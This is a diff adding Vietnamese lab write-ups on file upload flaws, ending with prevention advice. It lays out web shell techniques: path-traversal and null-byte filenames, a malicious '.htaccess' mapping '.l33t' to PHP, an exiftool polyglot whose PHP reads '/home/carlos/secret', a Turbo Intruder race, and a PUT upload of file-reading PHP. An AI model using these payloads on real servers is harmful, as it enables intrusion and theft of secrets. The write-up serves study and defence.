@@ -72,3 +72,133 @@ Phản hồi cho biết tệp đã được tải lên thành công.
 Bước 3: Chuyển sang tab Repeater khác chứa `GET /files/avatars/<YOUR-IMAGE>`. Trong đường dẫn, hãy thay thế tên tệp hình ảnh bằng `exploit.php` và gửi yêu cầu.
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7e63a558-97c2-4c30-be0c-00f3654a1024" />
 #### 2.2.2 Ngăn chặn việc thực thi tệp trong các thư mục mà người dùng có thể truy cập
+Máy chủ thường ngăn chặn việc tải lên các tệp nguy hiểm ngay từ đầu và chỉ thực thi những tập lệnh có kiểu MIME hợp lệ. Nếu không, hệ thống sẽ trả về lỗi hoặc hiển thị nội dung tệp dưới dạng văn bản, điều này có thể làm lộ mã nguồn nhưng không cho phép tạo web shell. Cấu hình bảo mật thường khác nhau giữa các thư mục: thư mục cho phép người dùng tải lên thường kiểm soát chặt chẽ hơn, trong khi các thư mục khác có thể ít hạn chế hơn và dễ bị khai thác để thực thi mã. Ngoài ra, do hạ tầng thường sử dụng proxy ngược hoặc cân bằng tải, yêu cầu có thể được xử lý bởi nhiều máy chủ nền với cấu hình khác nhau, tạo thêm khả năng phát sinh lỗ hổng.
+
+📘 **LAB 3: TẢI LÊN SHELL WEB THÔNG QUA ĐƯỜNG DẪN**
+
+Bước 1: Trong Burp Repeater, hãy chuyển đến tab chứa `POST /my-account/avatar` và tìm phần nội dung yêu cầu liên quan đến tệp PHP. Trong `Content-Disposition`, hãy thay đổi filename thành `filename="../exploit.php"` để bao gồm trình tự duyệt thư mục:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/197a4886-f212-4cf4-aa5b-6838d4504e89" />
+**Phản hồi cho biết `The file avatars/exploit.php has been uploaded`**
+
+Bước 2: Làm tối nghĩa trình tự duyệt thư mục bằng cách mã hóa URL /ký tự dấu gạch chéo ( ) bằng: `filename="..%2fexploit.php"`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7e78af64-ab82-4d66-8237-c72841cb0d27" />
+**Thông báo hiện ra rằng `The file avatars/../exploit.php has been uploaded`.Điều này cho biết tên tệp đang được máy chủ giải mã URL**
+
+Bước 3:Trong lịch sử proxy của Burp, hãy tìm `GET /files/avatars/..%2fexploit.php` Lưu ý rằng bí mật của Carlos đã được trả về trong phản hồi. Điều này cho thấy tệp đã được tải lên thư mục cao hơn trong hệ thống phân cấp tệp `(/files)` và sau đó được máy chủ thực thi
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7906f839-1412-499f-b5b9-77f97fa54dca" />
+Bước 4: Sử dụng `GET /files/exploit.php`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b33fcd52-d9e7-48c3-83e2-71846cbc647f" />
+
+#### 2.2.3 Danh sách đen các loại tệp nguy hiểm không đầy đủ
+**Ghi đè cấu hình máy chủ**
+
+Máy chủ web chỉ thực thi tập lệnh khi được cấu hình, chẳng hạn như Apache cần khai báo trong `apache2.conf` hoặc dùng tệp `.htaccess`, còn IIS dùng `web.config`. Các tệp cấu hình này cho phép thay đổi cách xử lý MIME hoặc quyền thực thi trong từng thư mục. Thông thường chúng không thể truy cập qua HTTP, nhưng nếu kẻ tấn công tải lên được tệp cấu hình độc hại, họ có thể ghi đè thiết lập bảo mật và ánh xạ phần mở rộng bất kỳ thành MIME thực thi, từ đó bỏ qua danh sách đen và chạy mã trái phép.
+
+📘 **LAB 4: TẢI LÊN SHELL WEB THÔNG QUA TIỆN ÍCH MỞ RỘNG BỎ QUA DANH SÁCH ĐEN**
+Bước 1: Tải tệp `exploit.php` làm ảnh đại diện. Phản hồi cho biết bạn không được phép tải lên các tệp có phần mở rộng `.php`. 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a3514f57-7569-4772-b40b-aaffdc923af9" />
+Bước 2: Trong Burp Repeater, hãy chuyển đến tab `POST /my-account/avatar` và tìm phần nội dung liên quan đến tệp PHP. Thực hiện các thay đổi sau:
+- Thay đổi giá trị của `filename` thành `.htaccess`.
+- Thay đổi giá trị của `Content-Type` thành `text/plain`.
+- Thay thế nội dung của tệp bằng lệnh Apache sau: `AddType application/x-httpd-php .l33t`
+
+Thao tác này ánh xạ một phần mở rộng tùy ý ( .l33t) đến kiểu MIME thực thi `application/x-httpd-php`. Khi máy chủ sử dụng mod_php, nó đã biết cách xử lý việc này.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0683b140-d33e-460a-8741-fe263ac2136e" />
+**Thông báo cho thấy tệp đã được tải lên thành công**
+
+Bước 4: Sử dụng mũi tên quay lại trong Burp Repeater để quay lại yêu cầu ban đầu để tải lên mã khai thác PHP. Thay đổi giá trị của filename từ `exploit.php` thành `exploit.l33t`.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/49d1d21b-501c-412b-b6d5-6fad6b1dbade" />
+**Gửi lại yêu cầu và lưu ý rằng tệp đã được tải lên thành công.**
+
+Bước 4: Chuyển sang tab `/files/avatars/`. Trong đường dẫn, hãy thay thế tên tệp hình ảnh bằng `exploit.l33t`và gửi yêu cầu.  
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0ef20c73-a016-4ae6-8794-7460698f278a" />
+Nhờ tệp độc hại `.htaccess` , `.l33t`đã được thực thi như thể nó là một `.php`.
+
+**Làm mờ phần mở rộng tệp**
+
+Đây là bản tóm tắt nội dung trên thành văn ngắn gọn:
+
+Kẻ tấn công có thể vượt qua danh sách đen kiểm tra phần mở rộng tệp bằng nhiều kỹ thuật làm mờ. Ví dụ: lợi dụng phân biệt chữ hoa chữ thường (`exploit.pHp`), dùng nhiều phần mở rộng (`exploit.php.jpg`), thêm ký tự thừa ở cuối (`exploit.php.`), hoặc mã hóa URL dấu chấm và ký tự đặc biệt (`exploit%2Ephp`). Ngoài ra, có thể chèn dấu chấm phẩy, byte rỗng (`exploit.asp;.jpg`, `exploit.asp%00.jpg`), dùng ký tự Unicode đa byte để đánh lừa cách phân tích cú pháp, hoặc lợi dụng việc hệ thống loại bỏ chuỗi cấm không đệ quy (`exploit.p.phphp`). Những kỹ thuật này cho phép tệp độc hại lọt qua xác thực và có thể được máy chủ thực thi.
+
+📘 **LAB 5: TẢI LÊN SHELL WEB THÔNG QUA PHẦN MỞ RỘNG TỆP BỊ LÀM MỜ**
+
+Bước 1: Trong `Content-Disposition`, hãy thay đổi giá trị của filename để bao gồm một byte null được mã hóa theo URL, theo sau là `.jpg`: `filename="exploit.php%00.jpg"`
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cbb5efaa-079a-4f52-bb10-8960cfb196f0" />
+Gửi yêu cầu và quan sát thấy tệp đã được tải lên thành công. Lưu ý rằng thông báo đề cập đến tệp là `exploit.php`, cho thấy byte null và `.jpg` đã bị xóa.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9d4e4840-c2c5-4681-9596-5b7a10e1e58a" />
+
+#### 2.2.4 Xác thực nội dung tệp lỗi
+* Máy chủ an toàn không chỉ dựa vào **Content-Type** trong yêu cầu mà còn kiểm tra nội dung thực tế của tệp.
+* Với ảnh, có thể kiểm tra thuộc tính nội tại như **kích thước**; nếu không có, tệp sẽ bị từ chối.
+* Một số định dạng có **chữ ký byte cố định** (ví dụ JPEG bắt đầu bằng `FF D8 FF`) để xác minh tính hợp lệ.
+* Đây là cách xác thực mạnh hơn, nhưng vẫn có thể bị bypass, ví dụ bằng cách tạo **tệp JPEG hợp lệ chứa mã độc trong metadata** với công cụ như **ExifTool**.
+
+📘 **LAB 6: THƯC THI MÃ TỪ XA THÔNG QUA TẢI LÊN SHELL WEB ĐA NGÔN NGỮ**
+Bước 1: Tạo một tệp PHP/JPG đa ngôn ngữ, về cơ bản là một hình ảnh bình thường, nhưng chứa dữ liệu PHP trong siêu dữ liệu. Một cách đơn giản để thực hiện việc này là tải xuống và chạy ExifTool từ dòng lệnh như sau:
+`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" Picture1.png  -o polyglot.php` 
+<img width="1920" height="238" alt="image" src="https://github.com/user-attachments/assets/c4d1e237-f596-4a2e-841e-3d017e8b952f" />
+Thao tác này sẽ thêm đoạn mã PHP vào trường hình ảnh Comment, sau đó lưu hình ảnh với `.php`.
+Bước 2:Trong trình duyệt, hãy tải hình ảnh đa ngôn ngữ lên làm ảnh đại diện, sau đó quay lại trang tài khoản 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ee84d458-2766-4412-8785-6f0e7534970d" />
+Bước 3: Trong lịch sử proxy của Burp, hãy tìm `GET /files/avatars/polyglot.php`. Sử dụng tính năng tìm kiếm của trình soạn thảo tin nhắn để tìm chuỗi ở đâu đó trong dữ liệu ảnh nhị phân trong phản hồi.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/90ad2874-ec82-493d-bdb1-ccf6be76c844" />
+
+#### 2.2.5 Khai thác điều kiện tranh chấp trong tính năng tải tệp lên
+* **Hệ thống hiện đại** thường an toàn hơn: lưu file vào thư mục tạm, đặt tên ngẫu nhiên, kiểm tra trước khi chuyển sang vị trí chính thức.
+* **Tự viết quy trình upload** dễ dẫn đến lỗi: nếu làm chưa tốt có thể xuất hiện race condition (điều kiện chạy đua).
+* **Ví dụ lỗ hổng**: trang web lưu file trực tiếp vào hệ thống, rồi sau đó mới chạy kiểm tra (diệt virus, validate). Nếu file không hợp lệ thì xóa. Trong vài mili-giây tồn tại, kẻ tấn công có thể truy cập và thực thi file.
+* **Đặc điểm**: lỗi này tinh vi, khó phát hiện bằng kiểm thử hộp đen, trừ khi có thể phân tích được mã nguồn.
+
+📘 **LAB 7: TẢI LÊN SHELL WEB THÔNG QUA ĐIỀU KIỆN CHẠY ĐUA**
+
+Bước 1: Sử dụng Turbo Intruder. Nhấp chuột phải vào `POST /my-account/avatar` để gửi tệp tải lên và chọn Tiện ích mở rộng > Turbo Intruder > Gửi đến Turbo Intruder 
+
+Bước 2: Trong tập lệnh, hãy thay thế `<YOUR-POST-REQUEST>` bằng toàn bộ `POST /my-account/avatar` chứa `exploit.php`.Thay thế `<YOUR-GET-REQUEST>` bằng yêu cầu GET tải tệp PHP đã tải lên, sau đó đổi tên tệp trong đường dẫn thành exploit.php
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cd242011-9bf8-4415-ab06-c93495a71161" /> 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c75ae68c-e4a4-4da7-9b87-856848d66afd" />
+Bước 3: Trong danh sách kết quả, lưu ý rằng một số GET nhận được phản hồi 200 chứa bí mật của Carlos. Những yêu cầu này đã đến máy chủ sau khi tệp PHP được tải lên, nhưng trước khi tệp không được xác thực và bị xóa.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/664246ee-6a48-4bbc-872f-836e3ae4e0ba" />
+
+----
+
+## 3. Upload Backdoor nâng cao:
+### 3.1 Khai thác lỗ hổng tải tệp lên mà không cần thực thi mã từ xa
+* **Tải lên tập lệnh phía máy chủ**: Nguy hiểm nhất, vì cho phép thực thi mã từ xa (RCE).
+* **Tải lên tập lệnh độc hại phía máy khách**:
+  * Dù không thực thi được trên máy chủ, nhưng có thể chèn mã XSS nếu tải lên các file như HTML, SVG có chứa thẻ `<script>`.
+  * Khi người dùng khác truy cập trang hiển thị file này, trình duyệt sẽ thực thi mã độc.
+  * Hạn chế: chỉ hoạt động nếu file được phục vụ từ cùng nguồn gốc (same-origin).
+* **Khai thác lỗ hổng trong xử lý tệp tải lên**:
+  * Nếu file được lưu trữ “an toàn”, vẫn có thể tấn công qua lỗi trong trình phân tích cú pháp.
+  * Ví dụ: khai thác XXE trong các định dạng dựa trên XML (như DOCX, XLSX).
+
+### 3.2 Tải tệp lên bằng PUT
+Một số máy chủ web có thể được cấu hình để hỗ trợ **PUT** requests.  
+Nếu không có biện pháp phòng vệ phù hợp, điều này có thể cung cấp một phương thức thay thế để tải lên các tệp độc hại, ngay cả khi chức năng tải lên không khả dụng qua giao diện web.
+
+**Ví dụ minh họa**:
+
+```http
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+````
+
+---
+
+## 4. Cách phòng ngừa:
+Việc cho phép người dùng tải tệp lên là bình thường, nhưng cần có biện pháp phòng ngừa để tránh lỗ hổng bảo mật. Các nguyên tắc chính gồm:
+
+* Chỉ cho phép tải lên những phần mở rộng tệp trong **danh sách trắng**.
+* Kiểm tra tên tệp, tránh chuỗi gây duyệt thư mục (như `../`).
+* **Đổi tên** tệp sau khi tải để tránh ghi đè.
+* Chỉ lưu tệp lên hệ thống sau khi **xác thực đầy đủ**.
+* Ưu tiên sử dụng **framework có sẵn** thay vì tự xây dựng cơ chế xác thực.
+
+
+
+
+
